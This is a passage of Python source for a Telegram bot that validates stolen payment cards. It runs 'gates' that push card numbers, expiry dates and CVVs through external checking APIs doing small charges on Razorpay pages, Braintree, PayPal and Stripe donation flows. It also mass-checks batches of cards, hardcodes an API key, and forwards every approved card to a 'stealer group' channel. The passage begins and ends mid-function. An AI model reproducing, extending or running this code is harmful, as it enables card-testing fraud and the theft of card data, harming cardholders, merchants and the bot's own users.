        try:
            success_gif = get_sexy_anime_gif("success")
            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {result['response']}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            failed_gif = get_sexy_anime_gif("failed")
            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
            await checking_msg.delete()
        except:
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

# ============================================================================
# RAZORPAY PAGES GATE - External API (/rzp, /mrzp)
# ============================================================================

@require_premium
async def gate_rzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay Pages checker using external API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("rzp"):
        await update.message.reply_text(offline_message("rzp"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/rzp 4242424242424242|12|25|123</code>\n"
            "<code>/rzp 4242424242424242|12|25|123 https://pages.razorpay.com/xxx 50</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV [site] [amount]\n"
            "Default site: pages.razorpay.com/iicdelhi\n"
            "Default amount: 10",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"

    args = update.message.text.split()
    site = "https://pages.razorpay.com/iicdelhi"
    amount = "10"
    for arg in args[1:]:
        if arg.startswith("http"):
            site = arg
        elif arg.isdigit():
            amount = arg

    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{card_str}</code>\n"
        f"Gateway: Razorpay Pages ₹{amount}",
        parse_mode=ParseMode.HTML
    )

    try:
        start_time = time_module.time()
        from modules.gate_api_config import get_gate_cfg as _gcfg_rz
        _rzp_base = _gcfg_rz("rzpauto_url", "https://rzpauto-production.up.railway.app/rzp")
        api_url = f"{_rzp_base}?cc={card_str}&site={site}&amount={amount}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}

        elapsed = time_module.time() - start_time
        status = (data.get("status", "error")).lower()
        message = data.get("message", "No response")
        payment_id = data.get("payment_id", "N/A")
        reason = data.get("reason", "N/A")
        api_time = data.get("time", elapsed)

        from modules.gate_checker import get_bin_info
        bin_info = get_bin_info(cc)
        username = user.username or user.first_name

        if status in ("authorized", "captured", "charged"):
            log_approved_card(user.id, username, cc, mm, yy, cvv, "rzp", message, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rzp", message, bin_info, user.id, username)
            response_text = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", f"Razorpay Pages ₹{amount}", bin_info, float(api_time), username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(animation=success_gif, caption=response_text, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response_text, parse_mode=ParseMode.HTML)
        else:
            response_text = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message} | {reason}", f"Razorpay Pages ₹{amount}", bin_info, float(api_time), username)
            try:
                failed_gif = get_sexy_anime_gif("failed")
                await update.message.reply_animation(animation=failed_gif, caption=response_text, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response_text, parse_mode=ParseMode.HTML)
    except asyncio.TimeoutError:
        await checking_msg.edit_text(ae("❌ <b>Request timed out (90s)</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        await checking_msg.edit_text(ae(f"❌ <b>Error:</b> {str(e)[:100]}"), parse_mode=ParseMode.HTML)


@require_premium
async def gate_mrzp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Razorpay Pages checker using external API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("mrzp"):
        await update.message.reply_text(offline_message("mrzp"), parse_mode=ParseMode.HTML)
        return
    import asyncio
    user = update.effective_user
    user_id = user.id

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return

    args_text = ""
    if context.args:
        args_text = ' '.join(context.args)
    else:
        txt_content = await get_txt_content_from_reply(update, context)
        if txt_content:
            args_text = txt_content
        elif update.message.reply_to_message and update.message.reply_to_message.text:
            args_text = update.message.reply_to_message.text

    site = "https://pages.razorpay.com/iicdelhi"
    amount = "10"
    clean_args = []
    for arg in args_text.split():
        if arg.startswith("http"):
            site = arg
        elif arg.isdigit() and len(arg) <= 5 and '|' not in arg:
            amount = arg
        else:
            clean_args.append(arg)

    cards_text = ' '.join(clean_args)

    if not cards_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Razorpay Pages</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/mrzp CC|MM|YY|CVV</code>\n"
            "<code>/mrzp CC|MM|YY|CVV https://pages.razorpay.com/xxx 50</code>\n\n"
            "Or reply to a .txt file with cards.\n"
            "One card per line. Max 50 cards.\n\n"
            "Default site: pages.razorpay.com/iicdelhi\n"
            "Default amount: ₹10",
            parse_mode=ParseMode.HTML
        )
        return

    extracted = extract_cards_from_text(cards_text)
    cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]

    if not cards:
        await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
        return

    limit = get_mass_check_limit(user.id)
    if len(cards) > limit:
        cards = cards[:limit]

    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'rzp'
    context.user_data['mass_check_stop'] = False

    status_msg = await _get_or_edit_loading_msg(
        context, update,
        f"🎀 <b>Mass Razorpay Pages Check</b>\n\n"
        f"📋 Cards: {len(cards)}\n"
        f"⚡ Gate: Razorpay Pages ₹{amount}\n"
        f"🌐 Site: {site.split('/')[-1]}\n"
        f"🔄 Processing 5 parallel with 1s delay...",
    )

    from modules.gate_checker import get_bin_info

    approved = []
    declined = []
    errors = []

    try:
        batch_size = 5
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]

        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break

            async def check_single_rzp(card):
                card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                try:
                    from modules.gate_api_config import get_gate_cfg as _gcfg_rz3
                    _rzp3 = _gcfg_rz3("rzpauto_url", "https://rzpauto-production.up.railway.app/rzp")
                    api_url = f"{_rzp3}?cc={card_str}&site={site}&amount={amount}"
                    async with aiohttp.ClientSession() as session:
                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                            else:
                                return card_str, "error", f"API Error {resp.status}", {}
                    status = (data.get("status", "error")).lower()
                    message = data.get("message", "No response")
                    return card_str, status, message, data
                except asyncio.TimeoutError:
                    return card_str, "error", "Timeout (90s)", {}
                except Exception as e:
                    return card_str, "error", str(e)[:50], {}

            tasks = [check_single_rzp(card) for card in batch]
            results = await asyncio.gather(*tasks)

            for card_str, status, message, data in results:
                if context.user_data.get('mass_check_stop'):
                    break

                username = user.username or user.first_name
                cc_part = card_str.split('|')[0]

                if status in ("authorized", "captured", "charged"):
                    payment_id = data.get("payment_id", "N/A")
                    approved.append(f"✅ {card_str}\n→ {message} | {payment_id}")
                    bin_info = get_bin_info(cc_part)
                    parts = card_str.split('|')
                    log_approved_card(user.id, username, parts[0], parts[1], parts[2], parts[3], "rzp", message, bin_info)
                    await send_to_stealer_group(context.bot, parts[0], parts[1], parts[2], parts[3], "rzp", message, bin_info, user.id, username)
                    await send_approved_card_with_gif(update, card_str, "rzp", message, float(data.get("time", 0)), bin_info)
                elif status == "error":
                    errors.append(f"⚠️ {card_str}\n→ {message}")
                else:
                    reason = data.get("reason", message)
                    declined.append(f"❌ {card_str}\n→ {reason}")

            total_done = len(approved) + len(declined) + len(errors)
            progress = (total_done / len(cards)) * 100

            progress_text = (
                f"🎀 <b>Mass Razorpay Pages Check</b>\n\n"
                f"✅ Approved: {len(approved)}\n"
                f"❌ Declined: {len(declined)}\n"
                f"⚠️ Errors: {len(errors)}\n\n"
                f"📊 Progress: {total_done}/{len(cards)} ({progress:.0f}%)\n"
                f"⏳ Batch {batch_num}/{len(batches)}..."
            )
            try:
                await status_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass

            if batch_num < len(batches) and not context.user_data.get('mass_check_stop'):
                await asyncio.sleep(1)

        stopped = context.user_data.get('mass_check_stop', False)
        status_label = "STOPPED" if stopped else "Complete"

        result_text = (
            f"📊 <b>Mass Razorpay Pages - {status_label}</b>\n\n"
            f"✅ Approved: {len(approved)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"⚠️ Errors: {len(errors)}\n"
            f"🌐 Site: {site.split('/')[-1]} | ₹{amount}\n\n"
        )

        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"

        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined[:10]:
                result_text += f"<code>{d}</code>\n"
            if len(declined) > 10:
                result_text += f"\n... and {len(declined) - 10} more declined\n"

        result_text += f"\n𝗨𝘀𝗲𝗿 : @{user.username or user.first_name}"

        try:
            await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)

    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False


# ============================================================================
# BRAINTREE AUTH GATE - BarryX API
# ============================================================================

@require_approval
async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree Auth Gate using BarryX API"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("b3"):
        await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
        return
    import aiohttp
    import time as time_module
    from modules.gate_checker import get_bin_info

    user = update.effective_user

    # Parse card
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/b3 4242424242424242|12|25|123</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{card_str}</code>\n"
        f"Gateway: Braintree Auth",
        parse_mode=ParseMode.HTML
    )
    
    try:
        start_time = time_module.time()
        
        # BarryX Braintree API
        from modules.gate_api_config import get_gate_cfg as _gcfg
        _bt_url = _gcfg("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
        _bt_key = _gcfg("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
        api_url = f"{_bt_url}?key={_bt_key}&card={card_str}&proxy="
        
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                else:
                    data = {"status": "error", "message": f"API Error {resp.status}"}
        
        elapsed = time_module.time() - start_time
        
        bin_info = get_bin_info(cc)
        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
        if bin_info.get('type'):
            bin_type += f" - {bin_info.get('type', '').upper()}"
        username = user.username or user.first_name
        
        status = str(data.get('status', 'error')).upper()
        message = str(data.get('message', 'Unknown response'))
        
        if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
            log_approved_card(user.id, username, cc, mm, yy, cvv, "b3", message, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", message, bin_info, user.id, username)
            
            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
            try:
                success_gif = get_sexy_anime_gif("success")
                await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                await checking_msg.delete()
            except:
                await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
        else:
            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message}", "Braintree Auth", bin_info, elapsed, username)
            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
    
    except Exception as e:
        await checking_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)

@require_premium
async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Braintree Auth with 5 batches and 1s delay"""
    user = update.effective_user

    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
    if not cards_text:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Braintree Auth</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.\n"
            "⏱️ 5 batches with 1s delay\n"
            "Or reply to a .txt file with this command.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_b3'] = True
        return

    await process_mass_b3(update, context, cards_text)

async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Braintree Auth check with 5 batches and 1s delay"""
    import aiohttp
    import time as time_module
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'b3'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        header_msg = await _get_or_edit_loading_msg(
            context, update,
            f"🔄 <b>Mass Braintree Auth Check</b>\n"
            f"Total: {total_cards}\n"
            f"⏱️ 5 batches, 1s delay\n"
            f"⏳ Processing...",
        )
        
        # Process in batches of 5 with 1 second delay
        batch_size = 5
        username = user.username or user.first_name
        
        async with aiohttp.ClientSession() as session:
            for batch_start in range(0, total_cards, batch_size):
                if context.user_data.get('mass_check_stop'):
                    break
                
                batch = cards[batch_start:batch_start + batch_size]
                
                # Process batch concurrently
                async def check_single_card(card):
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    try:
                        from modules.gate_api_config import get_gate_cfg as _gcfg2
                        _bt_url2 = _gcfg2("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
                        _bt_key2 = _gcfg2("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
                        api_url = f"{_bt_url2}?key={_bt_key2}&card={card_str}&proxy="
                        start_time = time_module.time()
                        
                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                            else:
                                data = {"status": "error", "message": f"API Error {resp.status}"}
                        
                        elapsed = time_module.time() - start_time
                        status = str(data.get('status', 'error')).upper()
                        message = str(data.get('message', 'Unknown'))
                        
                        return {
                            'card': card,
                            'card_str': card_str,
                            'status': status,
                            'message': message,
                            'elapsed': elapsed
                        }
                    except Exception as e:
                        return {
                            'card': card,
                            'card_str': card_str,
                            'status': 'ERROR',
                            'message': str(e)[:100],
                            'elapsed': 0
                        }
                
                # Run batch concurrently
                tasks = [check_single_card(card) for card in batch]
                results = await asyncio.gather(*tasks)
                
                # Process results
                for result in results:
                    card_str = result['card_str']
                    status = result['status']
                    message = result['message']
                    elapsed = result['elapsed']
                    card = result['card']
                    
                    bin_info = get_bin_info(card['cc'])
                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
                    
                    if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
                        approved_count += 1
                        log_approved_card(user.id, username, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", message, bin_info, user.id, username)
                        
                        response = _build_gate_response(card['cc'], card['mm'], card['yy'], card['cvv'], "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
                        try:
                            success_gif = get_sexy_anime_gif("success")
                            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                        except:
                            await update.message.reply_text(response, parse_mode=ParseMode.HTML)
                    elif status == 'ERROR':
                        error_count += 1
                    else:
                        declined_count += 1
                
                # Update progress
                processed = min(batch_start + batch_size, total_cards)
                try:
                    await header_msg.edit_text(
                        f"🔄 <b>Mass Braintree Auth Check</b>\n"
                        f"Progress: {processed}/{total_cards}\n"
                        f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
                
                # 1 second delay between batches
                if batch_start + batch_size < total_cards:
                    await asyncio.sleep(1)
        
        # Final summary
        await header_msg.edit_text(
            f"✅ <b>Mass Braintree Auth Complete!</b>\n\n"
            f"📊 <b>Results:</b>\n"
            f"✅ Approved: {approved_count}\n"
            f"❌ Declined: {declined_count}\n"
            f"⚠️ Errors: {error_count}\n"
            f"📋 Total: {total_cards}",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)[:200]}"))
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['awaiting_mass_b3'] = False

@require_premium
async def mass_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Razorpay with 5 batches and 0.25s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Razorpay ₹1</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Unlimited cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_rz'] = True
        return
    
    # If cards provided as args
    cards_text = ' '.join(context.args)
    await process_mass_rz(update, context, cards_text)

async def process_mass_rz(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Razorpay check with 5 batches and 0.25s delay using Nyvexis API"""
    import asyncio
    from modules.rpp_gate import check_razorpay
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'rz'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        msg = await _get_or_edit_loading_msg(
            context, update,
            f"🔄 <b>Mass Razorpay Check Started</b>\n\n"
            f"📊 Cards: {len(cards)}\n"
            f"⚡ Gate: Razorpay ₹1 (Nyvexis API)\n"
            f"🔄 Processing in 5 batches with 0.25s delay...",
        )
        
        approved = []
        declined = []
        errors = []
        
        batch_size = max(1, (len(cards) + 4) // 5)
        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
        
        for batch_num, batch in enumerate(batches, 1):
            if context.user_data.get('mass_check_stop'):
                break
            
            for card in batch:
                if context.user_data.get('mass_check_stop'):
                    break
                
                try:
                    result = await asyncio.wait_for(
                        check_razorpay(card['cc'], card['mm'], card['yy'], card['cvv'], amount=10),
                        timeout=60.0
                    )
                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                    
                    if result['status'] == 'APPROVED':
                        approved.append(f"✅ {card_str}\n→ {result['response']}")
                        bin_info = get_bin_info(card['cc'])
                        log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "rz", result['message'], bin_info)
                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "rz", result['message'], bin_info, user.id, user.username or user.first_name)
                        await send_approved_card_with_gif(update, card_str, "rz", result.get('message', 'CVV Match'), 3.0, bin_info)
                    elif result['status'] == 'DECLINED':
                        declined.append(f"❌ {card_str}\n→ {result['response']}")
                    else:
                        errors.append(f"⚠️ {card_str}\n→ {result['response']}")
                except asyncio.TimeoutError:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Timeout (60s)")
                except Exception as e:
                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
            
            progress_text = f"📊 <b>Mass Razorpay Check</b>\n\n"
            progress_text += f"✅ Approved: {len(approved)}\n"
            progress_text += f"❌ Declined: {len(declined)}\n"
            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
            
            try:
                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
            except:
                pass
            
            if context.user_data.get('mass_check_stop'):
                break
            
            if batch_num < len(batches):
                await asyncio.sleep(0.25)
        
        stopped = context.user_data.get('mass_check_stop', False)
        status_text = "STOPPED" if stopped else "Complete"
        result_text = f"📊 <b>Mass Razorpay Check {status_text}</b>\n\n"
        result_text += f"✅ Approved: {len(approved)}\n"
        result_text += f"❌ Declined: {len(declined)}\n"
        result_text += f"⚠️ Errors: {len(errors)}\n\n"
        
        if approved:
            result_text += "<b>✅ APPROVED:</b>\n"
            for a in approved:
                result_text += f"<code>{a}</code>\n\n"
        
        if declined:
            result_text += "<b>❌ DECLINED:</b>\n"
            for d in declined:
                result_text += f"<code>{d}</code>\n\n"
        
        try:
            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

async def stop_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the running mass check"""
    user = update.effective_user
    user_id = user.id
    
    if not context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "❌ <b>No Mass Check Running</b>\n\n"
            "There's no active mass check to stop.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data['mass_check_stop'] = True
    await update.message.reply_text(
        "⏹️ <b>Stopping Mass Check</b>\n\n"
        "Finishing current card and stopping...",
        parse_mode=ParseMode.HTML
    )

# PREMIUM GATES - PayPal
@require_premium
async def gate_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal $1 checker"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("pp"):
        await update.message.reply_text(offline_message("pp"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/pp 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: PayPal $1",
        parse_mode=ParseMode.HTML
    )
    
    import asyncio
    animations = [
        "⬜⬜⬜⬜⬜",
        "🟦⬜⬜⬜⬜",
        "🟦🟦⬜⬜⬜",
        "🟦🟦🟦⬜⬜",
        "🟦🟦🟦🟦⬜",
        "🟦🟦🟦🟦🟦"
    ]
    for anim in animations:
        try:
            await checking_msg.edit_text(
                f"🎀 <b>Checking card...</b> {anim}\n\n"
                f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"Gateway: PayPal $1",
                parse_mode=ParseMode.HTML
            )
            await asyncio.sleep(0.3)
        except:
            pass
    
    from modules.paypal_gate import check_paypal_async
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_paypal_async(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if result['status'] == 'APPROVED' or result['status'] == 'CHARGED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "pp", result['message'], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "pp", result['message'], bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {result['message']}", "PayPal $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {result['message']}", "PayPal $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

async def gate_ppv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal V2 Variable Price checker - Owner/Admin only"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("ppv"):
        await update.message.reply_text(offline_message("ppv"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user

    if not is_owner(user.id):
        await update.message.reply_text(
            "🔒 <b>Owner Only</b>\n\n"
            "This gate is restricted to bot owner and admins only.",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/ppv 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    use_proxy = not update.message.text.startswith('/addproxy')
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: PayPal V2 $0.01\n"
        f"Proxy: {'Enabled' if use_proxy else 'Disabled'}",
        parse_mode=ParseMode.HTML
    )
    
    import asyncio
    from modules.ppv_gate import check_ppv
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, check_ppv, cc, mm, yy, cvv, 0, use_proxy)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    
    status = result.get('result', 'ERROR')
    response_msg = result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    proxy_status = "Live ☁️" if use_proxy else "None"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "ppv", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ppv", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "PayPal V2", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "PayPal V2", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $1 Donation checker"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("str"):
        await update.message.reply_text(offline_message("str"), parse_mode=ParseMode.HTML)
        return
    import time as time_module
    user = update.effective_user

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/str 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
